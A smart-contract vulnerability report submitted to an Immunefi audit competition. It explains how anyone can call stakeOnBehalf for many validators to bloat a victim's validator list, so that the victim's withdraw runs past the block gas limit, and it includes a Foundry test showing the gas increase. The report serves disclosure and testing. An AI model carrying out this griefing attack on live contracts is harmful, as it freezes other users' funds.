# 50350 sc high stakingfacet stakeonbehalf allows to prevent withdraws

* Submitted on Jul 23rd 2025 at 23:00:56 UTC by @max10afternoon for [Attackathon | Plume Network](https://immunefi.com/audit-competition/plume-network-attackathon)
* Report ID: #50350
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/StakingFacet.sol>
* Impact: Temporary freezing of funds for at least 24 hours

## Description

### Brief/Intro

It is possible to halt withdraws for a particular user by gifting them plume via the `stakeOnBehalf` function.

### Vulnerability Details

The `withdraw` function internally calls `_cleanupValidatorRelationships` which calls `removeStakerFromAllValidators` in the `PlumeValidatorLogic` library:

```solidity
function removeStakerFromAllValidators(PlumeStakingStorage.Layout storage $, address staker) internal {
    // Make a copy to avoid iteration issues when removeStakerFromValidator is called
    uint16[] memory userAssociatedValidators = $.userValidators[staker];

    for (uint256 i = 0; i < userAssociatedValidators.length; i++) {
        uint16 validatorId = userAssociatedValidators[i];
        if ($.userValidatorStakes[staker][validatorId].staked == 0) {
            removeStakerFromValidator($, staker, validatorId);
        }
    }
}
```

This function iterates over each registered validator for a user.

The `stakeOnBehalf` function allows any user to stake on behalf of another user, registering new validators to that user's list if not already present:

```solidity
function stakeOnBehalf(uint16 validatorId, address staker) external payable returns (uint256) {
    if (staker == address(0)) {
        revert ZeroRecipientAddress();
    }

    uint256 stakeAmount = msg.value;

    // Perform all common staking setup for the beneficiary
    bool isNewStake = _performStakeSetup(staker, validatorId, stakeAmount);

    // Emit events
    emit Staked(staker, validatorId, stakeAmount, 0, 0, stakeAmount);
    emit StakedOnBehalf(msg.sender, staker, validatorId, stakeAmount);

    return stakeAmount;
}
```

Therefore, a malicious user can gift the minimum amount of PLUME necessary to register many validators in a victim's `userValidators` array, increasing the gas cost of the victim's `withdraw` transaction. This can push the gas cost beyond the block gas limit (unbounded gas consumption). Depending on PLUME and chain gas parameters, this can be achieved with relatively low cost for the attacker.

## Impact Details

A malicious user can prevent withdraws for a target user by inflating that user's registered validators list, effectively freezing assets in the contract until the contract is updated.

## Proof of Concept

<details>

<summary>Step-by-Step</summary>

* A malicious user can frontrun any withdraw call with one or multiple transactions that call `stakeOnBehalf` for many validators, registering them on the victim's account. This increases the iteration in `removeStakerFromAllValidators` and can push `withdraw` gas usage beyond the block limit.

</details>

### Coded PoC

Place the following test in the /attackathon-plume-network/plume/test folder to reproduce gas increase caused by `stakeOnBehalf`. The test demonstrates that registering many validators on behalf of a user increases the gas used by `withdraw`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { StdCheats } from "forge-std/StdCheats.sol";
import { Test, console2 } from "forge-std/Test.sol";

// Diamond Proxy & Storage
import { PlumeStaking } from "../src/PlumeStaking.sol";
import { PlumeStakingStorage } from "../src/lib/PlumeStakingStorage.sol";

// Custom Facet Contracts
import { AccessControlFacet } from "../src/facets/AccessControlFacet.sol";
import { ManagementFacet } from "../src/facets/ManagementFacet.sol";
import { RewardsFacet } from "../src/facets/RewardsFacet.sol";
import { StakingFacet } from "../src/facets/StakingFacet.sol";
import { ValidatorFacet } from "../src/facets/ValidatorFacet.sol";
import { IAccessControl } from "../src/interfaces/IAccessControl.sol";
import { IPlumeStakingRewardTreasury } from "../src/interfaces/IPlumeStakingRewardTreasury.sol";

// SolidState Diamond Interface & Cut Interface
import { IERC2535DiamondCutInternal } from "@solidstate/interfaces/IERC2535DiamondCutInternal.sol";
import { ISolidStateDiamond } from "@solidstate/proxy/diamond/ISolidStateDiamond.sol";

// Libs & Errors/Events
import { NoRewardsToRestake, NotValidatorAdmin, Unauthorized } from "../src/lib/PlumeErrors.sol";
import "../src/lib/PlumeErrors.sol";
import "../src/lib/PlumeEvents.sol";

import { PlumeRewardLogic } from "../src/lib/PlumeRewardLogic.sol";
import { PlumeRoles } from "../src/lib/PlumeRoles.sol"; // Needed for REWARD_PRECISION

// OZ Contracts
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Treasury Proxy
import { PlumeStakingRewardTreasury } from "../src/PlumeStakingRewardTreasury.sol";
import { PlumeStakingRewardTreasuryProxy } from "../src/proxy/PlumeStakingRewardTreasuryProxy.sol";

contract PlumeStakingStressTest is Test {


    address public user1;
    address public user2;
    address public user3;
    address public user4;
    address public admin;
    address public alice;
    address public bob;
    address public charlie;
    address public dave;
    address public validatorAdmin;

    // Diamond Proxy Address
    PlumeStaking internal diamondProxy;
    PlumeStakingRewardTreasury public treasury;

    // Addresses
    address public constant ADMIN_ADDRESS = 0xC0A7a3AD0e5A53cEF42AB622381D0b27969c4ab5;
    address payable public constant PLUME_NATIVE = payable(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE); // Payable for
        // treasury funding


    // Constants
    uint256 public constant MIN_STAKE = 1e17; // 0.1 PLUME for stress testing
    uint256 public constant INITIAL_COOLDOWN = 7 days; // Keep real cooldown
    uint16 public constant NUM_VALIDATORS = 15;
    uint256 public constant VALIDATOR_COMMISSION = 0.005 * 1e18; // 0.5% scaled by 1e18
    // Approx 5% APR for PLUME rewards per second = (0.05 * 1e18) / (365 days * 24 hours * 60 mins * 60 secs)
    uint256 public constant PLUME_REWARD_RATE_PER_SECOND = 1_585_489_599; // ~5% APR (5e16 / 31536000)

    // Test parameters
    uint256 constant MAX_RANDOM_STAKE_AMOUNT = 5 ether; // Max amount for a single random stake action
    uint256 constant TEST_STAKER_INITIAL_BALANCE = 100 ether; // Ensure test staker has plenty of funds
    uint256 constant GAS_TEST_NUM_ACTIONS = 100; // Number of actions to measure gas for

    // Cost calculation parameters (adjust as needed)
    uint256 constant ETH_PRICE_USD = 3500; // Example ETH price
    uint256 constant L2_GAS_PRICE_GWEI = 0.001 * 1e9; // Example L2 gas price (0.001 Gwei) - SCALE BY 1e9 for wei

    // Unique address for the staker whose actions we measure
    address constant TEST_STAKER = address(0xBADBADBAD);

    function setUp() public {
        console2.log("Starting Stress Test setup");

        admin = ADMIN_ADDRESS;
        vm.deal(admin, 10_000 ether); // Ensure admin has funds

        vm.startPrank(admin);

        // 1. Deploy Diamond Proxy
        diamondProxy = new PlumeStaking();
        assertEq(
            ISolidStateDiamond(payable(address(diamondProxy))).owner(), admin, "Deployer should be owner initially"
        );

        // 2. Deploy Custom Facets
        AccessControlFacet accessControlFacet = new AccessControlFacet();
        StakingFacet stakingFacet = new StakingFacet();
        RewardsFacet rewardsFacet = new RewardsFacet();
        ValidatorFacet validatorFacet = new ValidatorFacet();
        ManagementFacet managementFacet = new ManagementFacet();

        // 3. Prepare Diamond Cut
        IERC2535DiamondCutInternal.FacetCut[] memory cut = new IERC2535DiamondCutInternal.FacetCut[](5);

        // --- Get Selectors (using helper or manual list) ---
        bytes4[] memory accessControlSigs = new bytes4[](7);
        accessControlSigs[0] = AccessControlFacet.initializeAccessControl.selector;
        accessControlSigs[1] = IAccessControl.hasRole.selector;
        accessControlSigs[2] = IAccessControl.getRoleAdmin.selector;
        accessControlSigs[3] = IAccessControl.grantRole.selector;
        accessControlSigs[4] = IAccessControl.revokeRole.selector;
        accessControlSigs[5] = IAccessControl.renounceRole.selector;
        accessControlSigs[6] = IAccessControl.setRoleAdmin.selector;

        bytes4[] memory stakingSigs = new bytes4[](13);
        stakingSigs[0] = StakingFacet.stake.selector;
        stakingSigs[1] = StakingFacet.restake.selector;
        stakingSigs[2] = bytes4(keccak256("unstake(uint16)"));
        stakingSigs[3] = bytes4(keccak256("unstake(uint16,uint256)"));
        stakingSigs[4] = StakingFacet.withdraw.selector;
        stakingSigs[5] = StakingFacet.stakeOnBehalf.selector;
        stakingSigs[6] = StakingFacet.stakeInfo.selector;
        stakingSigs[7] = StakingFacet.amountStaked.selector;
        stakingSigs[8] = StakingFacet.amountCooling.selector;
        stakingSigs[9] = StakingFacet.amountWithdrawable.selector;
        //stakingSigs[10] = StakingFacet.cooldownEndDate.selector;
        stakingSigs[10] = StakingFacet.getUserValidatorStake.selector;
        stakingSigs[11] = StakingFacet.restakeRewards.selector;
        stakingSigs[12] = StakingFacet.totalAmountStaked.selector;

        bytes4[] memory rewardsSigs = new bytes4[](15);
        rewardsSigs[0] = RewardsFacet.addRewardToken.selector;
        rewardsSigs[1] = RewardsFacet.removeRewardToken.selector;
        rewardsSigs[2] = RewardsFacet.setRewardRates.selector;
        rewardsSigs[3] = RewardsFacet.setMaxRewardRate.selector;
        rewardsSigs[4] = bytes4(keccak256("claim(address)"));
        rewardsSigs[5] = bytes4(keccak256("claim(address,uint16)"));
        rewardsSigs[6] = RewardsFacet.claimAll.selector;
        rewardsSigs[7] = RewardsFacet.earned.selector;
        rewardsSigs[8] = RewardsFacet.getClaimableReward.selector;
        rewardsSigs[9] = RewardsFacet.getRewardTokens.selector;
        rewardsSigs[10] = RewardsFacet.getMaxRewardRate.selector;
        rewardsSigs[11] = RewardsFacet.tokenRewardInfo.selector;
        rewardsSigs[12] = RewardsFacet.setTreasury.selector;
        rewardsSigs[13] = RewardsFacet.getPendingRewardForValidator.selector;

        bytes4[] memory validatorSigs = new bytes4[](14);
        validatorSigs[0] = ValidatorFacet.addValidator.selector;
        validatorSigs[1] = ValidatorFacet.setValidatorCapacity.selector;
        validatorSigs[2] = ValidatorFacet.setValidatorCommission.selector;
        validatorSigs[3] = ValidatorFacet.setValidatorAddresses.selector;
        validatorSigs[4] = ValidatorFacet.setValidatorStatus.selector;
        validatorSigs[5] = ValidatorFacet.getValidatorInfo.selector;
        validatorSigs[6] = ValidatorFacet.getValidatorStats.selector;
        validatorSigs[7] = ValidatorFacet.getUserValidators.selector;
        validatorSigs[8] = ValidatorFacet.getAccruedCommission.selector;
        validatorSigs[9] = ValidatorFacet.getValidatorsList.selector;
        validatorSigs[10] = ValidatorFacet.getActiveValidatorCount.selector;
        validatorSigs[11] = ValidatorFacet.requestCommissionClaim.selector;
        validatorSigs[12] = ValidatorFacet.voteToSlashValidator.selector;
        validatorSigs[13] = ValidatorFacet.slashValidator.selector;

        bytes4[] memory managementSigs = new bytes4[](6); // Size reduced from 7 to 6
        managementSigs[0] = ManagementFacet.setMinStakeAmount.selector;
        managementSigs[1] = ManagementFacet.setCooldownInterval.selector;
        managementSigs[2] = ManagementFacet.adminWithdraw.selector;
        managementSigs[3] = ManagementFacet.getMinStakeAmount.selector; // Index shifted from 4
        managementSigs[4] = ManagementFacet.getCooldownInterval.selector; // Index shifted from 5
        managementSigs[5] = ManagementFacet.setMaxSlashVoteDuration.selector; // Index shifted from 6

        // Define the Facet Cuts
        cut[0] = IERC2535DiamondCutInternal.FacetCut({
            target: address(accessControlFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: accessControlSigs
        });
        cut[1] = IERC2535DiamondCutInternal.FacetCut({
            target: address(managementFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: managementSigs
        });
        cut[2] = IERC2535DiamondCutInternal.FacetCut({
            target: address(stakingFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: stakingSigs
        });
        cut[3] = IERC2535DiamondCutInternal.FacetCut({
            target: address(validatorFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: validatorSigs
        });
        cut[4] = IERC2535DiamondCutInternal.FacetCut({
            target: address(rewardsFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: rewardsSigs
        });

        // 4. Execute Diamond Cut
        ISolidStateDiamond(payable(address(diamondProxy))).diamondCut(cut, address(0), "");
        console2.log("Diamond cut applied.");

        // 5. Initialize
        diamondProxy.initializePlume(
            address(0),
            MIN_STAKE,
            INITIAL_COOLDOWN,
            1 days, // maxSlashVoteDuration
            50e16 // maxAllowedValidatorCommission (50%)
        );
        AccessControlFacet(address(diamondProxy)).initializeAccessControl();
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.ADMIN_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, admin); // Grant reward
            // manager
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.TIMELOCK_ROLE, admin);
        console2.log("Diamond initialized.");

        // 6. Deploy and setup reward treasury
        PlumeStakingRewardTreasury treasuryImpl = new PlumeStakingRewardTreasury();
        bytes memory initData =
            abi.encodeWithSelector(PlumeStakingRewardTreasury.initialize.selector, admin, address(diamondProxy));
        PlumeStakingRewardTreasuryProxy treasuryProxy =
            new PlumeStakingRewardTreasuryProxy(address(treasuryImpl), initData);
        treasury = PlumeStakingRewardTreasury(payable(address(treasuryProxy)));
        RewardsFacet(address(diamondProxy)).setTreasury(address(treasury));
        console2.log("Treasury deployed and set.");



        // 7. Setup Validators (15)
        uint256 defaultMaxCapacity = 1_000_000_000 ether; // High capacity
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            address valAdmin = vm.addr(uint256(keccak256(abi.encodePacked("validatorAdmin", i))));
            vm.deal(valAdmin, 1 ether); // Give admin some gas money
            ValidatorFacet(address(diamondProxy)).addValidator(
                i,
                VALIDATOR_COMMISSION,
                valAdmin, // Use unique admin
                valAdmin, // Use same address for withdraw for simplicity
                string(abi.encodePacked("l1val", i)),
                string(abi.encodePacked("l1acc", i)),
                vm.addr(uint256(keccak256(abi.encodePacked("l1evm", i)))),
                defaultMaxCapacity
            );
        }
        console2.log("%d validators added.", NUM_VALIDATORS);


        // 8. Add PLUME_NATIVE as the only reward token
        RewardsFacet(address(diamondProxy)).addRewardToken(PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND, PLUME_REWARD_RATE_PER_SECOND*2);
        treasury.addRewardToken(PLUME_NATIVE); // Also add to treasury allowed list
        vm.deal(address(treasury), 1_000_000 ether); // Give treasury a large amount of native ETH for rewards
        console2.log("PLUME_NATIVE reward token added and treasury funded.");

/*
        // 9. Set reward rates for PLUME_NATIVE
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = PLUME_NATIVE;
        uint256[] memory rates = new uint256[](1);
        rates[0] = PLUME_REWARD_RATE_PER_SECOND;
        // Set Max Rate slightly higher just in case
        RewardsFacet(address(diamondProxy)).setMaxRewardRate(PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND * 2);
        RewardsFacet(address(diamondProxy)).setRewardRates(rewardTokens, rates);
        */
        console2.log("PLUME reward rate set.");

        vm.stopPrank();
        console2.log("Stress Test setup complete.");



        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        user4 = makeAddr("user4");

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        dave = makeAddr("dave");

        // Fund users with ETH in setUp
        uint256 ethAmount = 1000 ether;
        vm.deal(user1, ethAmount);
        vm.deal(user2, ethAmount);
        vm.deal(user3, ethAmount);
        vm.deal(user4, ethAmount);
        vm.deal(validatorAdmin, ethAmount);

    }


 
    function testStakeAndUnstake() public {
        uint256 amount = 100e18;
        vm.startPrank(user1);
        

        //Stake
        StakingFacet(address(diamondProxy)).stake{value: amount}(
            0
        );


        // Unstake
        StakingFacet(address(diamondProxy)).unstake(0);


        vm.stopPrank();
        vm.warp(block.timestamp + INITIAL_COOLDOWN );

        //Test gas cost of regular withraw
        uint256 snapshot = vm.snapshot();

        vm.startPrank(user1);


        uint256 gasBefore = gasleft();
        StakingFacet(address(diamondProxy)).withdraw();
        uint256 gasAfter = gasleft();

        uint256 gasUsedRegular = gasBefore - gasAfter;

        console2.log("Gas used in regular withdraw");
        console2.log(gasUsedRegular);
        vm.stopPrank();




        //Test gas cost of inflated withdraw
        vm.revertTo(snapshot);
      

        vm.startPrank(user2);

        //User2 register multiple validators to user1
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            StakingFacet(address(diamondProxy)).stakeOnBehalf{value: MIN_STAKE}(i, user1);
        }
        
        vm.stopPrank();



       

        vm.startPrank(user1);


        gasBefore = gasleft();
        StakingFacet(address(diamondProxy)).withdraw();
        gasAfter = gasleft();

        uint256 gasUsedInflated = gasBefore - gasAfter;

        console2.log("Gas used in inflated withdraw");
        console2.log(gasUsedInflated);

        vm.stopPrank();


        assertGt(gasUsedInflated, gasUsedRegular);

 
    }


} // End Contract
```

Notes:

* The PoC shows gas usage increase; with enough validator registrations on behalf of a victim, withdraw gas can grow large enough to be unexecutable in a block.
* The attack is possible because `stakeOnBehalf` can modify a victim's `userValidators` list without the victim's consent.
